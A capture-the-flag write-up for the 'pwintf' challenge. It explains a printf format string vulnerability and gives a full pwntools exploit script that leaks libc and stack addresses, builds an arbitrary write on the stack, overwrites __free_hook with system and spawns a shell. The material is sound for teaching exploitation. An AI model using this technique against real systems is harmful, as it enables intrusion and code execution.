# pwintf

## Challenge

The program prints a welcome message then we enter an infinite loop where our input is reflected back.

```
Wewcome b-back?!! Peopwe wewe t-twying t-to hack my pwogwam, so I stopped putting the x3 fwag in memowy ÚwÚ
Hello world!
Hello world!
test message
test message
```

The source code is very simple and we can verify the claim that the flag is not in memory:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    puts("Wewcome b-back?!! Peopwe wewe t-twying t-to hack my pwogwam, so I stopped putting the x3 fwag in memowy ÚwÚ");
    while(1) {
        char* input = malloc(0x100);

        fgets(input, 0x100, stdin);

        printf(input);

        free(input);
    }
}

int main() {
    alarm(60);
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    vuln();

    return 0;
}
```

There is also no way to break out of the while-loop normally.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The stack canary is irrelevant here as there is no way to write to the stack normally.

## Solution

There is a format string vulnerability in `vuln`, similar to the "baby-pwintf" challenge.

```c
printf(input);
```

We can pass our own format string here, allowing us to read and write values in memory.

Using the `%n` conversion specifier, we can also 2 bytes anywhere we have a pointer to on the stack.
It is theoretically possible to write more, but the time it would take to write this many bytes makes
it undesirable.
Also, there is a good chance that the challenge will time out if we spend too much time printing
characters to achieve larger writes.

To achieve a read anywhere and write anywhere primitive, we first need full control over some addresses
on the stack.
We can start using a stack address which points to another stack address.
This way, we can use the first address to modify the least significant byte of the second address,
making it point at different bytes on the stack.
This control over the second address lets us write any value in a region of the stack, 1 or 2 bytes at a
time.
With 4 or 8 of these writes, we can put entire addresses on the stack, which we can use to read or write
anywhere in memory.

An ideal pointer to use for this is the saved RBP, as it often points to another saved RBP pointer.
Sometimes this is not the case, such as when the format string vulnerability is in the `main` function.
In these cases, we could also use the environment variable pointers, though we may need to leak some
stack addresses to get the correct offsets.

We also need a few leaks for this.
We need to leak the libc address so we can use its gadgets in a ropchain, or to find `__free_hook` to
overwrite it.
We also need a stack address leak so we know where to write the addresses for our read/write primitive.

The leaks are easy enough to achieve.
We can use `%p` to print pointers from the stack.
The `__libc_start_to_main` return address and saved RBP are useful in our case.

Once we have our leaks, we can set up our addresses for an arbitrary write.

```py
def write_on_stack(value, offset):
    for i in range(4):
        io.sendline("%{}c%13$hn".format((stack_addr_0 + 8 * (offset - 6) + 2 * i) % 0x10000).encode())
        io.recvline(1)

        chars = (value // (0x10000 ** i)) % 0x10000
        if chars == 0:
            io.sendline("%{}$hn".format(stack_offset).encode())
        else:
            io.sendline("%{}c%{}$hn".format(chars, stack_offset).encode())
        io.recvline(1)
```

Note that the program frees our string every time.
If we write the address of `system` to `__free_hook` and put `"/bin/sh"` in our string, we can make the
program spawn a shell instead of freeing this chunk.
To do so, we need to completely overwrite the hook in one iteration of the loop.
Otherwise, it will try to call an incomplete address and likely segfault.

```py
write_on_stack(libc.sym['__free_hook'], 8)
write_on_stack(libc.sym['__free_hook'] + 2, 9)
write_on_stack(libc.sym['__free_hook'] + 4, 10)
write_on_stack(libc.sym['__free_hook'] + 6, 11)
```

To write everything in one pass, we place 4 `__free_hook` addresses on the stack, each at a different
offset.
We can then use multiple `%n` conversion specifiers to write to all of these addresses.
It is important to keep track of how many characters have been written at each stage so we write the
correct values.

```py
chars = ((target % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%8$hn"

chars = (((target // 0x10000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%9$hn"

chars = (((target // 0x100000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%10$hn"

chars = (((target // 0x1000000000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%11$hn"
```

Once we send our final payload, `__free_hook` will be overwritten and we get a shell when the program
tries to free our string.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1442 pwintf
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwintf')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1442)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvline()

io.sendline(b"%11$p\n%6$p\n%13$p")

libc.address = int(io.recvuntil(b"\n", drop=True), 0) - libc.libc_start_main_return
stack_addr_0 = int(io.recvuntil(b"\n", drop=True), 0) - 0x20
stack_addr_1 = int(io.recvuntil(b"\n", drop=True), 0)

stack_offset = 6 + (stack_addr_1 - stack_addr_0) // 8

io.info("Libc: " + hex(libc.address))
io.info("Stack 0: " + hex(stack_addr_0))
io.info("Stack 1: " + hex(stack_addr_1))



def write_on_stack(value, offset):
    for i in range(4):
        io.sendline("%{}c%13$hn".format((stack_addr_0 + 8 * (offset - 6) + 2 * i) % 0x10000).encode())
        io.recvline(1)

        chars = (value // (0x10000 ** i)) % 0x10000
        if chars == 0:
            io.sendline("%{}$hn".format(stack_offset).encode())
        else:
            io.sendline("%{}c%{}$hn".format(chars, stack_offset).encode())
        io.recvline(1)

print(hex(libc.address))

write_on_stack(libc.sym['__free_hook'], 8)
write_on_stack(libc.sym['__free_hook'] + 2, 9)
write_on_stack(libc.sym['__free_hook'] + 4, 10)
write_on_stack(libc.sym['__free_hook'] + 6, 11)

target = libc.sym['system']
payload = "/bin/bash #"
written = len(payload)

chars = ((target % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%8$hn"

chars = (((target // 0x10000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%9$hn"

chars = (((target // 0x100000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%10$hn"

chars = (((target // 0x1000000000000) % 0x10000) - (written % 0x10000) + 0x10000) % 0x10000
written += chars
payload += "%{}c".format(chars)
payload += "%11$hn"

io.sendline(payload.encode())
io.recvline()

io.interactive()
```

## Flag

```
maple{h0p3_1t_d1dnt_t4k3_l0ng}
```
